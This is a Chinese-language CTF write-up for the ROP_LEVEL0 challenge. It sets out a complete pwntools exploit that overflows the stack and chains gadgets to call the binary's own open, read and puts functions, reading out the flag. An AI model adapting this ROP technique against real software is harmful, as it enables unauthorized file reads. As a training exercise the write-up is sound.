# ROP_LEVEL0

## 题目简述

64 位程序存在栈溢出，但没有直接给出 `system` 或 `/bin/sh`。二进制自身导入了 `read`、`open` 和 `puts`，因此可在不依赖 libc 地址的情况下构造文件读取型 ROP：先把文件名写入可写段，再打开并读出 flag。

## 解题过程

返回地址前的偏移为 88 字节。官方构建中可使用 `pop rdi; ret`、`pop rsi; pop r15; ret` 两个 gadget，并把 `.bss` 地址 `0x601060` 作为文件名和内容缓冲区：

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./ROP_LEVEL0", checksec=False)
io = process(elf.path)

pop_rsi_r15 = 0x400751
pop_rdi = 0x400753
read_plt = 0x400500
open_plt = 0x400520
puts_plt = 0x4004E0
buf = 0x601060

payload = flat(
    b"A" * 88,

    # read(0, buf, rdx)：rdx 沿用漏洞函数调用时的可用长度。
    pop_rsi_r15, buf, 0,
    read_plt,

    # open(buf, 0)
    pop_rdi, buf,
    pop_rsi_r15, 0, 0,
    open_plt,

    # 官方远端中 open 返回的文件描述符为 4。
    pop_rdi, 4,
    pop_rsi_r15, buf, 0,
    read_plt,

    # puts(buf)
    pop_rdi, buf,
    puts_plt,
)

io.send(payload)
io.sendline(b"./flag\x00")
io.interactive()
```

第一段 `read` 把 `./flag\0` 放进 `.bss`；第二段调用 `open`；第三段把已打开文件读回同一缓冲区；最后由 `puts` 输出。该链依赖两项题目现场状态：`rdx` 在各次 `read` 前仍是足够大的值，以及目标文件描述符确为 4。若本地复现不一致，应通过调试器确认寄存器状态，或补充控制 `rdx` 的 gadget，并使用 `open` 返回值可传递的调用序列。

## 方法总结

- 核心技巧：复用程序已有的 `open`、`read`、`puts` 完成 ORW，不需要 libc 泄露。
- 识别信号：栈溢出配合文件 I/O 导入函数和可写 `.bss`，通常可以直接构造文件读取链。
- 复用要点：绝对 gadget 地址、返回地址偏移、`rdx` 初值和文件描述符都与具体构建及运行环境有关，必须现场验证。
